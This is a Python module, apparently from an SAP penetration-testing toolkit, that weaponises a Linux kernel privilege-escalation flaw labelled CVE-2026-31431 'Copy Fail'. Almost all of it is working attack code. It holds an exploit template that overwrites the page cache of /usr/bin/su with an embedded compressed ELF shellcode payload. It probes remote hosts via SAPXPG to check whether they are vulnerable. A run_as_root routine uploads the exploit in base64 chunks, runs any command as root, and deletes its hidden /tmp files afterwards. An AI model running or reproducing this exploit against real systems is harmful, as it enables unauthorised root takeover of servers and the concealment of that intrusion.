#!/usr/bin/env python3
"""CVE-2026-31431 'Copy Fail' — one-shot root command execution.

Delivers the exploit as a modified Python script that, instead of
dropping to an interactive root shell, runs a caller-supplied command
and writes its stdout+stderr to /tmp/.cf_result, then exits.

The exploit (stdlib-only Python 3, 732 bytes in original form) uses the
AF_ALG AEAD interface (authencesn/hmac(sha256)/cbc(aes)) to splice file
pages into crypto buffers, thereby writing 4 controlled bytes into any
readable file's kernel page cache without needing write permission.

Attack surface used here:
  1. /usr/bin/su is readable by all users and has the SETUID bit set.
  2. We write a custom minimal ELF (160-170 bytes) over su's page cache.
     The ELF does: setreuid(0,0); execve('/tmp/.cf_run.sh', NULL, NULL)
  3. We write the caller's command to /tmp/.cf_run.sh before exploitation.
  4. We call os.system('su'), which now executes our ELF as root.
  5. /tmp/.cf_run.sh runs the command and writes output to /tmp/.cf_result.
  6. Page cache eviction (reboot or memory pressure) restores /usr/bin/su
     automatically — the on-disk binary is never modified.

Affected kernels: < 6.18.22, < 6.19.12.  Patch: upstream commit fixing
copy_file_range() in the af_alg splice path (CVE-2026-31431).

IMPORTANT — for authorised penetration testing only.
"""
from __future__ import annotations

import re
import base64 as _b64
from typing import Optional

# ---------------------------------------------------------------------------
# Vulnerability metadata
# ---------------------------------------------------------------------------

COPYFAIL_CVE = "CVE-2026-31431"

# (major, minor, patch) at which each branch was fixed.
# A kernel on branch (major, minor) is safe if its patch >= the value here.
COPYFAIL_KERNELS_FIXED = [(6, 18, 22), (6, 19, 12), (7, 0, 0)]


# ---------------------------------------------------------------------------
# Exploit script template
# ---------------------------------------------------------------------------

# The exploit is the real CVE-2026-31431 proof-of-concept by theori-io
# (https://github.com/theori-io/copy-fail-CVE-2026-31431), modified so that:
#   - The compressed ELF payload executes /tmp/.cf_run.sh (not /bin/sh)
#   - After page-cache patching, os.system('su') runs the wrapper as root
#   - The wrapper script contains __COMMAND__ and writes output to
#     /tmp/.cf_result.  The placeholder is substituted at delivery time.
#
# Original exploit structure (kept intact):
#   def d(x): decode hex
#   def c(f,t,c): AF_ALG splice — writes 4 bytes c into page cache of
#                 file-descriptor f at offset t
#   Main loop: decompress ELF payload e, write it 4 bytes at a time via c()
#   Final call: os.system('su')  -> now executes our payload ELF as root
#
# Custom ELF payload (168 bytes → zlib-compressed, x86-64 ABI):
#   0x78:  xor eax,eax / xor edi,edi / mov al,0x69 / syscall  ; setreuid(0,0)
#          lea rdi,[rip+9]                                       ; -> path str
#          xor esi,esi / xor rdx,rdx / mov al,0x3b / syscall   ; execve(path,0,0)
#          xor edi,edi / push 60 / pop rax / syscall            ; exit(0)
#          "/tmp/.cf_run.sh\0"                                  ; path string
#
# The wrapper /tmp/.cf_run.sh is written before running the exploit:
#   #!/bin/sh
#   __COMMAND__ > /tmp/.cf_result 2>&1

# Compressed hex of the custom ELF (see make_elf_execve('/tmp/.cf_run.sh') in
# dev notes — regenerate with: python3 -c "import struct,zlib; ...")
_CUSTOM_PAYLOAD_HEX = (
    "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c1640351019"
    "905a563459647a059407a319042094e101c3ff1b32f9593d7a6d3941dc6f1e8697"
    "3658f3b31afecfb289e067d52fc92dd0d74b4e8b2f2acdd32bce60600000f86314b2"
)

# The actual exploit code — faithful to the original, with payload swapped
# and the final system call replaced by our root-runner.  __COMMAND__ is
# substituted by run_as_root() before delivery.
COPYFAIL_EXPLOIT_TEMPLATE = r"""#!/usr/bin/env python3
# CVE-2026-31431 Copy Fail — one-shot root exec (modified from theori-io PoC)
import os as g, zlib, socket as s, subprocess

CMD = '__COMMAND__'

def d(x): return bytes.fromhex(x)
def c(f, t, b):
    a = s.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = t + 4
    i = d('00')
    u.sendmsg(
        [b"A" * 4 + b],
        [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)],
        32768,
    )
    r, w = g.pipe()
    n = g.splice
    n(f, w, o, offset_src=0)
    n(r, u.fileno(), o)
    try:
        u.recv(8 + t)
    except Exception:
        pass

# Write the wrapper script that will run our command as root
wrapper = '/tmp/.cf_run.sh'
with open(wrapper, 'w') as _wf:
    _wf.write('#!/bin/sh\n')
    _wf.write(CMD + ' > /tmp/.cf_result 2>&1\n')
g.chmod(wrapper, 0o755)

# Load the custom ELF payload (execves /tmp/.cf_run.sh after setreuid(0,0))
f = g.open('/usr/bin/su', 0)
i = 0
e = zlib.decompress(d('__PAYLOAD_HEX__'))
while i < len(e):
    c(f, i, e[i:i + 4])
    i += 4

# Execute the now-patched /usr/bin/su — runs as root, execves our wrapper
g.system('su')
"""

# Substitute the payload hex at module load time (it never changes)
COPYFAIL_EXPLOIT_TEMPLATE = COPYFAIL_EXPLOIT_TEMPLATE.replace(
    '__PAYLOAD_HEX__', _CUSTOM_PAYLOAD_HEX
)


# ---------------------------------------------------------------------------
# Vulnerability check helpers
# ---------------------------------------------------------------------------

def is_kernel_vulnerable(kernel_str: str) -> bool:
    """Parse 'uname -r' output and return True if the kernel is vulnerable.

    A kernel is vulnerable if it has not yet received the CVE-2026-31431
    backport on its stable branch:
      - 6.18.x: fixed at 6.18.22
      - 6.19.x: fixed at 6.19.12
      - 7.0+:   not affected (integrated before release)
      - All other branches (6.12, 6.6, 5.15, …): treat as potentially
        vulnerable unless we can confirm a distro backport (conservative).
    """
    m = re.search(r'(\d+)\.(\d+)\.(\d+)', kernel_str)
    if not m:
        return False
    kv = tuple(int(x) for x in m.groups())
    major, minor = kv[0], kv[1]

    if major >= 7:
        return False  # 7.0+ integrated the fix before release

    if major == 6 and minor == 18 and kv >= (6, 18, 22):
        return False  # patched on the 6.18 stable branch

    if major == 6 and minor == 19 and kv >= (6, 19, 12):
        return False  # patched on the 6.19 stable branch

    # All other branches (6.12, 6.6, 5.15, …): conservative — treat as
    # potentially vulnerable.  Distro backports are not detectable from
    # uname alone, so we flag it and let the operator decide.
    return True


def check_copyfail(node) -> dict:
    """Check if a SAP node's host is vulnerable to CVE-2026-31431.

    Runs three quick OS-exec probes via SAPXPG:
      1. uname -r  — kernel version
      2. grep authencesn /proc/crypto  — AF_ALG algorithm availability
      3. python3 --version  — interpreter version (need 3.10+)

    Returns a dict with keys:
      vulnerable    bool   — True if all conditions are met
      kernel        str    — raw uname -r output
      python_ok     bool   — True if python3 3.10+ is present
      authencesn_ok bool   — True if authencesn appears in /proc/crypto
      reason        str    — human-readable verdict
      details       dict   — raw output per probe
    """
    from sapmap_exploit import execute_gw_command

    def _run(prog, arg):
        r = execute_gw_command(node, prog, arg, long_params="")
        return "\n".join(r.get("output") or []).strip()

    result: dict = {
        "vulnerable": False,
        "kernel": "",
        "python_ok": False,
        "authencesn_ok": False,
        "reason": "",
        "details": {},
    }

    # Only Linux hosts are affected
    if "windows" in (node.os_type or "").lower():
        result["reason"] = "Windows host — not applicable"
        return result

    # 1. Kernel version
    kernel_str = _run("uname", "-r")
    result["kernel"] = kernel_str
    result["details"]["kernel"] = kernel_str

    if not kernel_str or not any(c.isdigit() for c in kernel_str):
        result["reason"] = f"Could not read kernel version: {kernel_str!r}"
        return result

    if not is_kernel_vulnerable(kernel_str):
        result["reason"] = f"Kernel {kernel_str} is >= patched version"
        return result

    # 2. authencesn availability in AF_ALG
    crypto_out = _run("grep", "authencesn /proc/crypto")
    result["authencesn_ok"] = "authencesn" in crypto_out
    result["details"]["crypto"] = crypto_out[:200]

    if not result["authencesn_ok"]:
        result["reason"] = (
            "authencesn not in /proc/crypto — AF_ALG path not exploitable"
        )
        return result

    # 3. Python 3.10+ (exploit uses socket.setsockopt(h, 5, None, 4) syntax
    #    introduced in Python 3.10)
    py_out = _run("python3", "--version")
    result["python_ok"] = bool(py_out and "Python 3" in py_out)
    result["details"]["python"] = py_out

    if not result["python_ok"]:
        result["reason"] = (
            f"python3 not available or wrong version: {py_out!r}"
        )
        return result

    pm = re.search(r'Python 3\.(\d+)', py_out)
    if pm and int(pm.group(1)) < 10:
        result["reason"] = (
            f"Python 3.{pm.group(1)} < 3.10 required by exploit"
        )
        return result

    result["vulnerable"] = True
    result["reason"] = (
        f"Kernel {kernel_str} is vulnerable, "
        f"authencesn present, Python 3.10+ available"
    )
    return result


# ---------------------------------------------------------------------------
# Root command execution
# ---------------------------------------------------------------------------

def run_as_root(node, command: str, timeout: float = 30.0) -> dict:
    """Execute a shell command as root via CVE-2026-31431 Copy Fail LPE.

    Workflow:
      1. Build the exploit script (COPYFAIL_EXPLOIT_TEMPLATE with CMD set).
      2. Base64-encode it and write it to /tmp/.cf_b64.txt via SAPXPG
         printf calls (60-char chunks to stay within the 128-byte PARAMS
         limit).
      3. Decode to /tmp/.cf_exp.py and chmod 700.
      4. Run: python3 /tmp/.cf_exp.py
         The script writes /tmp/.cf_run.sh (the command), patches su's page
         cache with the custom ELF, then calls os.system('su') to get root
         and execute the wrapper.
      5. Read /tmp/.cf_result via base64 (handles binary/long output).
      6. Clean up all temp files.

    Returns {ok, stdout, stderr, exit_code, error}.
    """
    def _run(prog, arg):
        from sapmap_exploit import execute_gw_command
        r = execute_gw_command(node, prog, arg, long_params="")
        out = "\n".join(r.get("output") or []).strip()
        return out, r.get("success", False)

    def _read_b64(path):
        """Read a remote file via base64 — handles 128B SAPXPG output limit."""
        out, ok = _run("base64", path)
        if not ok or not out:
            out2, _ = _run("sudo", f"base64 {path}")
            out = out2
        if not out:
            return None
        try:
            return _b64.b64decode(out.replace("\n", "").replace("\r", ""))
        except Exception:
            return None

    result: dict = {
        "ok": False,
        "stdout": "",
        "stderr": "",
        "exit_code": -1,
        "error": "",
    }

    sid = getattr(node, 'sid', '?')

    # Substitute the caller's command into the exploit template
    safe_cmd = (
        command
        .replace("\\", "\\\\")
        .replace("'", "\\'")
        .replace('"', '\\"')
    )
    script = COPYFAIL_EXPLOIT_TEMPLATE.replace("__COMMAND__", safe_cmd)
    script_b64 = _b64.b64encode(script.encode()).decode()

    exp_path    = "/tmp/.cf_exp.py"
    b64_path    = "/tmp/.cf_b64.txt"
    result_path = "/tmp/.cf_result"
    wrapper_path = "/tmp/.cf_run.sh"

    # --- Step 1: Write base64 of exploit to /tmp/.cf_b64.txt ---------------
    # printf is used (not echo) to avoid shell interpretation issues.
    # Each chunk is 60 chars — well within the 128-byte PARAMS limit.
    chunk_size = 60
    for i, start in enumerate(range(0, len(script_b64), chunk_size)):
        chunk = script_b64[start:start + chunk_size]
        redirect = ">" if i == 0 else ">>"
        _run("sh", f"-c 'printf \"%s\" {chunk} {redirect} {b64_path}'")

    # --- Step 2: Decode to Python script ------------------------------------
    _run("sh", f"-c 'base64 -d {b64_path} > {exp_path}'")
    _run("rm",  f"-f {b64_path}")
    _run("chmod", f"700 {exp_path}")

    # --- Step 3: Run the exploit --------------------------------------------
    print(f"[*] {sid}: run_as_root — launching Copy Fail (CVE-2026-31431)...")
    out, _ok = _run("python3", f"{exp_path}")
    print(f"[*] {sid}: run_as_root — exploit returned: {out[:200]!r}")

    # --- Step 4: Read result ------------------------------------------------
    result_bytes = _read_b64(result_path)
    if result_bytes is not None:
        result["stdout"] = result_bytes.decode("utf-8", errors="replace")
        result["ok"] = True
    else:
        result["error"] = (
            f"Result file {result_path} not found or empty. "
            f"Exploit output: {out[:300]}"
        )

    # --- Step 5: Cleanup ----------------------------------------------------
    _run("rm", f"-f {exp_path} {result_path} {wrapper_path}")

    return result
